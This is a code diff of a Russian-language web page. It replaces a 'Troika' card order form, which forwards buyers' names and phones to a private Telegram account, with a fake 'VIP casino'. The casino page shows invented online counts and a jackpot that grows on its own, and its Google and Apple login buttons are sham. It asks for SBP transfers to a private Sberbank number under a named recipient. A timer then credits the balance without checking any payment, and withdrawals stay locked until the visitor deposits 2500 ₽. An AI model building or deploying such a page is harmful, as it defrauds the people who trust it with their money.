@@ -3,346 +3,516 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Премиум-заказ карты «Тройка»</title>
-    <!-- Подключаем красивый шрифт Montserrat -->
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>VIP Casino Fortune & Stars</title>
+    
     <style>
         :root {
-            --primary: #003399;
-            --primary-light: #e6f0fa;
-            --accent: #ff3333;
-            --accent-hover: #e02e2e;
-            --bg-gradient: linear-gradient(135deg, #003399 0%, #001a4d 100%);
+            --bg-color: #0b0b11;
+            --card-bg: #151522;
+            --primary-color: #e61c5d;
+            --accent-color: #00f2fe;
+            --text-color: #ffffff;
+            --text-muted: #8a8da2;
+            --warning-color: #ff4757;
+            --gold-color: #ffaa00;
+            --border-color: #2a2a40;
+            --input-bg: #0f0f1a;
+            --sidebar-bg: #11111e;
+            --neon-glow: 0 0 15px rgba(230, 28, 93, 0.6);
+            --gradient-bg: radial-gradient(circle at center, #1e112a 0%, #0b0b11 100%);
+        }
+
+        body.light-theme {
+            --bg-color: #f0f2f5;
             --card-bg: #ffffff;
-            --text-main: #2b2d42;
-            --text-muted: #8d99ae;
-            --border-color: #e2e8f0;
-            --tg-color: #229ED9;
+            --primary-color: #d60e4b;
+            --accent-color: #0097a7;
+            --text-color: #1c1c24;
+            --text-muted: #65676b;
+            --warning-color: #e53935;
+            --gold-color: #b78103;
+            --border-color: #e4e6eb;
+            --input-bg: #f5f6f7;
+            --sidebar-bg: #ffffff;
+            --neon-glow: 0 4px 12px rgba(214, 14, 75, 0.2);
+            --gradient-bg: linear-gradient(180deg, #e4e6eb 0%, #f0f2f5 100%);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
         }
 
         body {
-            font-family: 'Montserrat', sans-serif;
-            background: var(--bg-gradient);
-            color: var(--text-main);
-            margin: 0;
-            padding: 20px;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 10px;
+            background: var(--gradient-bg);
+            overflow-x: hidden;
         }
 
-        .order-container {
-            background-color: var(--card-bg);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        .casino-container {
             width: 100%;
-            max-width: 500px;
-            box-sizing: border-box;
-            transform: translateY(0);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .order-container:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .header h2 {
-            font-size: 26px;
-            font-weight: 800;
-            color: var(--primary);
-            margin: 0 0 8px 0;
-            letter-spacing: -0.5px;
-        }
-
-        .header p {
-            color: var(--text-muted);
-            font-size: 14px;
-            margin: 0;
-        }
-
-        .form-group {
-            margin-bottom: 22px;
+            max-width: 480px;
+            background: var(--card-bg);
+            border-radius: 28px;
+            padding: 24px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            border: 1px solid var(--border-color);
             position: relative;
         }
 
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            font-size: 14px;
-            color: var(--text-main);
-        }
-
-        input[type="text"],
-        input[type="tel"],
-        select {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid var(--border-color);
-            border-radius: 10px;
-            box-sizing: border-box;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 15px;
-            color: var(--text-main);
-            background-color: #fafbfc;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        input:hover, select:hover {
-            border-color: #cbd5e1;
-        }
-
-        input:focus, select:focus {
-            outline: none;
-            border-color: var(--primary);
-            background-color: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 51, 153, 0.1);
-        }
-
-        .design-selector {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
+        /* ХЕДЕР И МЕНЮ */
+        .top-settings-bar {
+            display: flex;
+            flex-direction: column;
             gap: 10px;
-            margin-bottom: 22px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border-color);
         }
-
-        .design-option {
-            border: 2px solid var(--border-color);
-            border-radius: 10px;
-            padding: 10px;
-            text-align: center;
-            cursor: pointer;
+        .top-row-widgets {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+        .theme-toggle-btn {
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            padding: 6px 12px;
+            border-radius: 20px;
             font-size: 12px;
             font-weight: 600;
-            transition: all 0.2s ease;
-            background: #fafbfc;
-        }
-
-        .design-option input {
-            display: none;
-        }
-
-        .design-option:hover {
-            border-color: var(--primary);
-        }
-
-        .design-option.active {
-            border-color: var(--primary);
-            background-color: var(--primary-light);
-            color: var(--primary);
-        }
-
-        .price-display {
-            background: var(--primary-light);
-            padding: 18px;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 16px;
-            font-weight: 600;
-            color: var(--primary);
-            margin-bottom: 25px;
-            border: 1px dashed rgba(0, 51, 153, 0.3);
-        }
-
-        .price-display span {
-            font-size: 24px;
-            font-weight: 800;
-            display: inline-block;
-            transition: transform 0.2s ease;
-        }
-
-        button {
-            width: 100%;
-            padding: 16px;
-            background-color: var(--accent);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 16px;
-            font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 4px 14px rgba(255, 51, 51, 0.4);
-            transition: all 0.3s ease;
         }
-
-        button:hover {
-            background-color: var(--accent-hover);
-            box-shadow: 0 6px 20px rgba(255, 51, 51, 0.6);
-            transform: translateY(-2px);
+        .online-counter {
+            font-size: 12px;
+            font-weight: 700;
+            color: #20bf6b;
+            background: rgba(32, 191, 107, 0.1);
+            padding: 6px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
-
-        button:active {
-            transform: translateY(1px);
-        }
-
-        /* Стили для ссылки на Telegram */
-        .telegram-footer {
-            margin-top: 25px;
+        .request-status-badge {
+            font-size: 12px;
+            font-weight: bold;
+            padding: 6px 12px;
+            border-radius: 20px;
+            background: rgba(120,120,120,0.08);
+            color: var(--text-muted);
             text-align: center;
-            border-top: 1px solid var(--border-color);
-            padding-top: 20px;
+            border: 1px solid transparent;
+        }
+        .request-status-badge.processing {
+            background: rgba(255, 170, 0, 0.15);
+            color: var(--gold-color);
+            border-color: rgba(255, 170, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
+
+        /* СИСТЕМНЫЕ ЭКРАНЫ */
+        .screen { display: none; }
+        .screen.active { display: block; }
+        h2 { margin-bottom: 20px; text-align: center; font-size: 24px; text-transform: uppercase; color: var(--text-color); }
+
+        /* ТАБЛО И БАЛАНС */
+        .jackpot-board {
+            background: linear-gradient(135deg, rgba(230,28,93,0.15) 0%, rgba(21,21,34,0.4) 100%);
+            border: 2px solid var(--primary-color);
+            box-shadow: var(--neon-glow);
+            padding: 12px;
+            border-radius: 14px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .jackpot-amount { font-size: 26px; font-weight: 800; color: var(--gold-color); }
+        
+        .user-status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(120,120,120,0.05);
+            padding: 8px 14px;
+            border-radius: 30px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            border: 1px solid var(--border-color);
         }
 
-        .telegram-link {
-            display: inline-flex;
+        /* СОЦИАЛЬНЫЕ КНОПКИ ВХОДА */
+        .social-auth-providers {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn-oauth {
+            display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            color: var(--tg-color);
-            text-decoration: none;
-            font-weight: 600;
+            gap: 10px;
+            width: 100%;
+            padding: 12px;
+            border-radius: 12px;
             font-size: 14px;
-            transition: opacity 0.2s;
+            font-weight: 600;
+            cursor: pointer;
+            border: 1px solid var(--border-color);
+            background: #ffffff;
+            color: #000000;
         }
+        .btn-oauth.apple-btn { background: #000000; color: #ffffff; border: 1px solid #222222; }
+        .btn-oauth img { width: 18px; height: 18px; }
 
-        .telegram-link:hover {
-            opacity: 0.8;
-        }
+        /* ИГРОВОЙ ХОЛЛ */
+        .games-lobby { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
+        .game-card-tab { background: var(--input-bg); border: 1px solid var(--border-color); padding: 10px; border-radius: 14px; text-align: center; cursor: pointer; font-size: 12px; font-weight: bold; }
+        .game-card-tab.active { border-color: var(--accent-color); background: rgba(0,242,254,0.1); }
+        .game-zone { display: none; background: rgba(0,0,0,0.15); border-radius: 18px; padding: 15px; border: 1px solid var(--border-color); margin-bottom: 15px; text-align: center;}
+        .game-zone.active { display: block; }
 
-        .telegram-link svg {
-            width: 20px;
-            height: 20px;
-            fill: var(--tg-color);
-        }
+        /* КАССА И РЕКВИЗИТЫ */
+        .alert-casino { background: rgba(255, 71, 87, 0.08); border: 1px solid rgba(255, 71, 87, 0.3); border-left: 4px solid var(--warning-color); padding: 14px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; color: var(--warning-color); }
+        .casino-card { background: var(--input-bg); border-radius: 16px; padding: 16px; margin-bottom: 20px; border: 1px solid var(--border-color); }
+        .brand-header-logos { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; margin-bottom: 14px; }
+        .sber-text { font-weight: 700; font-size: 20px; color: #22c34a; }
+        .copy-box { display: flex; align-items: center; justify-content: space-between; background: var(--card-bg); padding: 10px 12px; border-radius: 10px; border: 1px solid var(--border-color); margin-top: 4px; }
+        .copy-btn { background: var(--primary-color); border: none; color: white; padding: 6px 12px; border-radius: 8px; font-size: 12px; cursor: pointer; }
+
+        /* НАВИГАЦИЯ */
+        .bottom-nav { display: none; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 25px; border-top: 1px solid var(--border-color); padding-top: 15px; }
+        .nav-btn { background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-muted); padding: 12px 6px; border-radius: 12px; font-weight: 600; cursor: pointer; }
+        .nav-btn.active { background: var(--primary-color); color: #fff; }
+
+        /* ФОРМЫ И КНОПКИ */
+        .field-group { margin-bottom: 16px; text-align: left; }
+        .field-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 6px; }
+        input, select { width: 100%; background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-color); padding: 14px; border-radius: 12px; font-size: 15px; outline: none; }
+        .btn-core { width: 100%; background: var(--primary-color); border: none; color: white; padding: 15px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        .btn-core:disabled { background: #444455 !important; color: #888899 !important; cursor: not-allowed; }
     </style>
 </head>
 <body>
 
-    <div class="order-container">
-        <div class="header">
-            <h2>Карта «Тройка»</h2>
-            <p>Выберите срок действия и индивидуальный дизайн</p>
+<div class="casino-container">
+
+    <div class="top-settings-bar">
+        <div class="top-row-widgets">
+            <button class="theme-toggle-btn" onclick="toggleTheme()">🎨 Сменить тему</button>
+            <div class="online-counter">🔴 Онлайн: <span id="live-online-count">10,421</span></div>
         </div>
+        <div class="request-status-badge" id="global-status-badge">Заявок нет</div>
+    </div>
 
-        <form id="troikaForm" onsubmit="sendToTelegram(event)">
+    <div id="screen-auth" class="screen active">
+        <h2>Регистрация VIP</h2>
+        <div style="display: flex; flex-direction: column; gap: 16px;">
+            <div class="field-group">
+                <label>Логин аккаунта</label>
+                <input type="text" id="authLogin" placeholder="Придумайте уникальный логин" value="VIP_Игрок">
+            </div>
+            <div class="field-group">
+                <label>Пароль</label>
+                <input type="password" id="authPassword" placeholder="••••••••" value="12345">
+            </div>
+            <button class="btn-core" onclick="fastLogin('Обычный Игрок')">Создать Личный Кабинет</button>
             
-            <div class="form-group">
-                <label for="fullName">ФИО получателя</label>
-                <input type="text" id="fullName" name="fullName" placeholder="Иванов Иван Иванович" required>
+            <div style="text-align: center; font-size: 12px; color: var(--text-muted); text-transform: uppercase; margin: 5px 0;">или быстрый вход через</div>
+            
+            <div class="social-auth-providers">
+                <button class="btn-oauth" onclick="fastLogin('Google VIP Игрок')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="G">
+                    Войти с Google
+                </button>
+                <button class="btn-oauth apple-btn" onclick="fastLogin('Apple VIP Игрок')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter: invert(1);" alt="A">
+                    Войти с Apple ID
+                </button>
             </div>
-
-            <div class="form-group">
-                <label for="phone">Номер телефона</label>
-                <input type="tel" id="phone" name="phone" placeholder="+7 (999) 000-00-00" required>
-            </div>
-
-            <div class="form-group">
-                <label>Дизайн карты</label>
-                <div class="design-selector">
-                    <label class="design-option active" onclick="selectDesign(this)">
-                        <input type="radio" name="design" value="Классика" checked> Классика
-                    </label>
-                    <label class="design-option" onclick="selectDesign(this)">
-                        <input type="radio" name="design" value="Метро"> Метро
-                    </label>
-                    <label class="design-option" onclick="selectDesign(this)">
-                        <input type="radio" name="design" value="Cyber"> Cyberpunk
-                    </label>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label for="duration">Срок подписки</label>
-                <select id="duration" name="duration" onchange="updatePrice()">
-                    <option value="1 месяц — 1 000 ₽">1 месяц — 1 000 ₽</option>
-                    <option value="2 месяца — 2 000 ₽">2 месяца — 2 000 ₽</option>
-                    <option value="3 месяца — 3 000 ₽">3 месяца — 3 000 ₽</option>
-                    <option value="4 месяца — 4 000 ₽">4 месяца — 4 000 ₽</option>
-                    <option value="5 месяцев — 5 000 ₽">5 месяцев — 5 000 ₽</option>
-                    <option value="6 месяцев — 6 000 ₽">6 месяцев — 6 000 ₽</option>
-                    <option value="7 месяцев — 7 000 ₽">7 месяцев — 7 000 ₽</option>
-                    <option value="8 месяцев — 8 000 ₽">8 месяцев — 8 000 ₽</option>
-                    <option value="9 месяцев — 9 000 ₽">9 месяцев — 9 000 ₽</option>
-                    <option value="10 месяцев — 10 000 ₽">10 месяцев — 10 000 ₽</option>
-                    <option value="11 месяцев — 11 000 ₽">11 месяцев — 11 000 ₽</option>
-                    <option value="12 месяцев — 12 000 ₽" selected>1 год (12 месяцев) — 12 000 ₽</option>
-                </select>
-            </div>
-
-            <div class="price-display">
-                Итого к оплате: <br><span id="totalPrice">12000</span> ₽
-            </div>
-
-            <button type="submit">Отправить заказ в Telegram</button>
-        </form>
-
-        <!-- Ссылка на Telegram-канал внизу -->
-        <div class="telegram-footer">
-            <a href="https://t.me/cosinobigwin" target="_blank" class="telegram-link">
-                <svg viewBox="0 0 24 24">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.25.38-.51 1.05-.78 4.11-1.79 6.85-2.97 8.22-3.55 3.91-1.67 4.72-1.96 5.24-1.97.12 0 .39.03.56.17.14.12.18.28.2.45-.02.07-.02.13-.04.2z"/>
-                </svg>
-                Наш Telegram-канал
-            </a>
         </div>
     </div>
 
-    <script>
-        // Функция расчета цены с анимацией
-        function updatePrice() {
-            const selectElement = document.getElementById('duration');
-            const selectedText = selectElement.options[selectElement.selectedIndex].text;
-            
-            // Вытаскиваем число из текста для расчета
-            let months = parseInt(selectedText);
-            if (selectedText.includes('год')) months = 12;
-            
-            const totalPrice = months * 1000;
-            
-            const priceSpan = document.getElementById('totalPrice');
-            priceSpan.innerText = totalPrice.toLocaleString('ru-RU');
-            
-            priceSpan.style.transform = 'scale(1.1)';
-            setTimeout(() => {
-                priceSpan.style.transform = 'scale(1)';
-            }, 200);
+    <div id="screen-game" class="screen">
+        <div class="jackpot-board">
+            <div style="font-size: 11px; color: var(--text-muted);">🔥 НАКОПИТЕЛЬНЫЙ VIP ДЖЕКПОТ 🔥</div>
+            <div class="jackpot-amount" id="jackpot-counter">748,920 ₽</div>
+        </div>
+
+        <div class="user-status-bar">
+            <div>Баланс: <span style="color: #20bf6b; font-weight: bold;" id="user-balance">5,000 ₽</span></div>
+            <div>Статус: <span style="color: var(--accent-color); font-weight:bold;" id="user-status-text">VIP Клиент</span></div>
+        </div>
+
+        <div class="games-lobby">
+            <div class="game-card-tab active" id="tab-wheel" onclick="switchGame('wheel')">🎡 Колесо</div>
+            <div class="game-card-tab" id="tab-slots" onclick="switchGame('slots')">🎰 Слоты</div>
+        </div>
+
+        <div class="game-zone active" id="zone-wheel">
+            <p style="margin-bottom: 15px; color: var(--text-muted);">Испытайте удачу на Колесе Фортуны!</p>
+            <button class="btn-core" style="background: var(--gold-color); color: #000;" onclick="playDummyGame()">Крутить Колесо</button>
+        </div>
+
+        <div class="game-zone" id="zone-slots">
+            <p style="margin-bottom: 15px; color: var(--text-muted);">🎰 Классические VIP Слоты 4★</p>
+            <button class="btn-core" style="background: var(--gold-color); color: #000;" onclick="playDummyGame()">Дёрнуть Рычаг</button>
+        </div>
+        
+        <div id="game-message" style="text-align:center; font-weight:bold; color:var(--accent-color); margin-top:10px;"></div>
+    </div>
+
+    <div id="screen-deposit" class="screen">
+        <h2>Пополнение Кассы</h2>
+        <div class="alert-casino">
+            <strong>⚠️ ВНИМАНИЕ:</strong> Переводы принимаются строго через Систему Быстрых Платежей (<strong>СБП</strong>).
+        </div>
+        
+        <div class="casino-card">
+            <div class="brand-header-logos">
+                <span class="sber-text">💚 СБЕРБАНК</span>
+                <span style="font-weight: bold; color: #ffaa00;">СБП перевод</span>
+            </div>
+            <div class="field-group">
+                <span style="font-size: 12px; color: var(--text-muted);">Номер телефона для перевода</span>
+                <div class="copy-box">
+                    <span id="phoneNum" style="font-family: monospace; font-size: 15px;">+7 (999) 123-45-67</span>
+                    <button class="copy-btn" onclick="copyNum()">Копировать</button>
+                </div>
+            </div>
+            <div style="margin-top: 10px; font-size: 14px;">
+                Получатель: <strong style="color: #fff;">Содыров Мухаммадрасул Н.</strong>
+            </div>
+        </div>
+        
+        <div class="field-group">
+            <label>Сумма перевода</label>
+            <input type="number" id="depositAmount" placeholder="Введите сумму в ₽" value="2500">
+        </div>
+        
+        <button class="btn-core" id="depositSubmitBtn" onclick="triggerDepositTimer()">Я оплатил(а), проверить зачисление</button>
+    </div>
+
+    <div id="screen-withdraw" class="screen">
+        <h2>Выплата Выигрыша</h2>
+        <div class="alert-casino" style="color: var(--gold-color); border-color: var(--gold-color);">
+            <strong>🔒 УСЛОВИЕ КАЗИНО:</strong> Для вывода приветственного бонуса необходимо совершить хотя бы одно пополнение на сумму от 2500 ₽.
+        </div>
+        <div class="field-group">
+            <label>Номер карты или телефона (СБП)</label>
+            <input type="tel" placeholder="+7 (999) 000-00-00">
+        </div>
+        <div class="field-group">
+            <label>Сумма выплаты</label>
+            <input type="number" placeholder="Введите сумму в ₽">
+        </div>
+        <button class="btn-core" style="background: #20bf6b;" onclick="triggerWithdraw()">Вывести средства</button>
+    </div>
+
+    <div class="bottom-nav" id="main-navigation">
+        <button class="nav-btn active" id="btn-nav-game" onclick="navigate('game')">🎰 ИГРА</button>
+        <button class="nav-btn" id="btn-nav-deposit" onclick="navigate('deposit')">📥 КАССА</button>
+        <button class="nav-btn" id="btn-nav-withdraw" onclick="navigate('withdraw')">📤 ВЫВОД</button>
+    </div>
+
+</div>
+
+<script>
+    let currentBalance = 5000;
+    let hasDeposited = false;
+    let depositInterval = null;
+
+    // ЧИСТЫЙ ВХОД (ИМИТАЦИЯ БЕЗ БАЗЫ ДАННЫХ КАК В APPLE ID)
+    function fastLogin(typeLabel) {
+        let enteredLogin = document.getElementById('authLogin').value || "Игрок";
+        
+        localStorage.setItem('isLoggedIn', 'true');
+        localStorage.setItem('username', enteredLogin);
+        localStorage.setItem('userStatus', typeLabel);
+        
+        if(!localStorage.getItem('balance')) {
+            localStorage.setItem('balance', '5000');
         }
+        
+        alert(`🎉 Успешный вход! Создан VIP кабинет для: ${enteredLogin}`);
+        initSession();
+    }
 
-        // Выбор дизайна
-        function selectDesign(element) {
-            document.querySelectorAll('.design-option').forEach(opt => opt.classList.remove('active'));
-            element.classList.add('active');
-            element.querySelector('input').checked = true;
+    function initSession() {
+        if(localStorage.getItem('isLoggedIn') === 'true') {
+            currentBalance = parseInt(localStorage.getItem('balance') || '5000');
+            hasDeposited = localStorage.getItem('hasDeposited') === 'true';
+            
+            document.getElementById('user-balance').innerText = currentBalance.toLocaleString() + " ₽";
+            document.getElementById('user-status-text').innerText = localStorage.getItem('userStatus') || "VIP Клиент";
+            
+            document.getElementById('screen-auth').classList.remove('active');
+            document.getElementById('main-navigation').style.display = 'grid';
+            
+            checkActiveTimer(); // Проверяем, не шёл ли таймер до обновления страницы
+            navigate('game');
         }
+    }
 
-        // Отправка данных анкеты в Telegram
-        function sendToTelegram(event) {
-            event.preventDefault(); // Предотвращаем перезагрузку страницы
+    // ТАЙМЕР НА 5 МИНУТ ПРИ НАЖАТИИ "Я ОПЛАТИЛ"
+    function triggerDepositTimer() {
+        let amt = parseInt(document.getElementById('depositAmount').value);
+        if(!amt || amt <= 0) { alert("Укажите сумму пополнения!"); return; }
 
-            const fullName = document.getElementById('fullName').value;
-            const phone = document.getElementById('phone').value;
-            const design = document.querySelector('input[name="design"]:checked').value;
-            const durationSelect = document.getElementById('duration');
-            const duration = durationSelect.options[durationSelect.selectedIndex].text;
-            const totalPrice = document.getElementById('totalPrice').innerText;
+        // Расчитываем время окончания (текущее время + 5 минут)
+        let endTime = Date.now() + (5 * 60 * 1000);
+        localStorage.setItem('depositTimerEndTime', endTime);
+        localStorage.setItem('depositTimerRunning', 'true');
+        localStorage.setItem('tempAmount', amt);
 
-            // Формируем текст сообщения
-            const message = `🎫 Новый заказ карты Тройка!\n\n` +
-                            `👤 ФИО: ${fullName}\n` +
-                            `📞 Телефон: ${phone}\n` +
-                            `🎨 Дизайн: ${design}\n` +
-                            `⏳ Срок: ${duration}\n` +
-                            `💰 Сумма: ${totalPrice} ₽`;
+        runCountdown(endTime, amt);
+        alert("✅ Заявка передана в шлюз СБП. Платёжная сессия запущена. Пожалуйста, ожидайте верификации (5 минут).");
+    }
 
-            // Кодируем текст для URL ссылки
-            const encodedMessage = encodeURIComponent(message);
+    function runCountdown(endTime, amount) {
+        const btn = document.getElementById('depositSubmitBtn');
+        const badge = document.getElementById('global-status-badge');
+        
+        btn.disabled = true;
+        badge.className = "request-status-badge processing";
+        badge.innerHTML = "⏳ Верификация платежа по СБП...";
 
-            // Перенаправляем пользователя в Telegram для отправки сообщения (откроется диалог или бот)
-            const telegramUrl = `https://t.me/ismammma?text=${encodedMessage}`;
-            window.open(telegramUrl, '_blank');
+        if(depositInterval) clearInterval(depositInterval);
+
+        depositInterval = setInterval(() => {
+            let timeLeft = endTime - Date.now();
+
+            if(timeLeft <= 0) {
+                // Время вышло — зачисляем баланс
+                clearInterval(depositInterval);
+                localStorage.removeItem('depositTimerEndTime');
+                localStorage.removeItem('depositTimerRunning');
+                localStorage.removeItem('tempAmount');
+
+                btn.disabled = false;
+                btn.innerText = "Я оплатил(а), проверить зачисление";
+                
+                currentBalance += parseInt(amount);
+                hasDeposited = true;
+                localStorage.setItem('balance', currentBalance);
+                localStorage.setItem('hasDeposited', 'true');
+                
+                document.getElementById('user-balance').innerText = currentBalance.toLocaleString() + " ₽";
+                badge.className = "request-status-badge";
+                badge.innerHTML = "Заявок нет";
+
+                alert(`🎉 СБП перевод успешно подтвержден! На ваш баланс зачислено ${amount} ₽.`);
+                navigate('game');
+            } else {
+                // Считаем минуты и секунды
+                let min = Math.floor((timeLeft / 1000 / 60) % 60);
+                let sec = Math.floor((timeLeft / 1000) % 60);
+                
+                min = min < 10 ? "0" + min : min;
+                sec = sec < 10 ? "0" + sec : sec;
+
+                btn.innerText = `⏳ Проверка транзакции (${min}:${sec})`;
+            }
+        }, 1000);
+    }
+
+    function checkActiveTimer() {
+        if(localStorage.getItem('depositTimerRunning') === 'true') {
+            let endTime = parseInt(localStorage.getItem('depositTimerEndTime'));
+            let amt = localStorage.getItem('tempAmount');
+
+            if(endTime && Date.now() < endTime) {
+                runCountdown(endTime, amt);
+            } else {
+                // Если время вышло, пока вкладка была закрыта
+                localStorage.removeItem('depositTimerEndTime');
+                localStorage.removeItem('depositTimerRunning');
+                localStorage.removeItem('tempAmount');
+            }
         }
+    }
 
-        window.onload = updatePrice;
-    </script>
+    // ОСТАЛЬНАЯ ЛОГИКА ИНТЕРФЕЙСА
+    function navigate(screenId) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById('screen-' + screenId).classList.add('active');
+        
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        if(document.getElementById('btn-nav-' + screenId)) {
+            document.getElementById('btn-nav-' + screenId).classList.add('active');
+        }
+    }
 
+    function switchGame(gameId) {
+        document.querySelectorAll('.game-card-tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.game-zone').forEach(z => z.classList.remove('active'));
+        document.getElementById('tab-' + gameId).classList.add('active');
+        document.getElementById('zone-' + gameId).classList.add('active');
+        document.getElementById('game-message').innerText = "";
+    }
+
+    function playDummyGame() {
+        if(currentBalance < 500) { alert("Недостаточно средств! Пополните баланс в кассе."); return; }
+        currentBalance -= 500;
+        localStorage.setItem('balance', currentBalance);
+        document.getElementById('user-balance').innerText = currentBalance.toLocaleString() + " ₽";
+        
+        document.getElementById('game-message').innerText = "🎰 Барабаны крутятся...";
+        setTimeout(() => {
+            let win = Math.random() > 0.4 ? 1500 : 0;
+            if(win > 0) {
+                currentBalance += win;
+                localStorage.setItem('balance', currentBalance);
+                document.getElementById('user-balance').innerText = currentBalance.toLocaleString() + " ₽";
+                document.getElementById('game-message').innerText = `🎉 Крупный выигрыш: +${win} ₽!`;
+            } else {
+                document.getElementById('game-message').innerText = "❌ Ставка не сыграла! Попробуйте ещё раз.";
+            }
+        }, 1000);
+    }
+
+    function triggerWithdraw() {
+        if(!hasDeposited) {
+            alert("❌ Ошибка вывода! По регламенту требуется верификация аккаунта через одно минимальное пополнение кассы (от 2500 ₽).");
+        } else {
+            alert("✅ Заявка на вывод отправлена на ручную модерацию оператором банка.");
+        }
+    }
+
+    function copyNum() {
+        navigator.clipboard.writeText("+79991234567");
+        alert("Номер телефона успешно скопирован в буфер обмена!");
+    }
+
+    function toggleTheme() {
+        document.body.classList.toggle('light-theme');
+    }
+
+    window.onload = function() {
+        initSession();
+        // Плавный счетчик онлайна
+        setInterval(() => {
+            let num = 10000 + Math.floor(Math.random() * 500);
+            document.getElementById('live-online-count').innerText = num.toLocaleString();
+        }, 3000);
+        // Рост джекпота
+        setInterval(() => {
+            let num = parseInt(document.getElementById('jackpot-counter').innerText.replace(/[^0-9]/g, '')) + 15;
+            document.getElementById('jackpot-counter').innerText = num.toLocaleString() + " ₽";
+        }, 2000);
+    }
+</script>
 </body>
 </html>
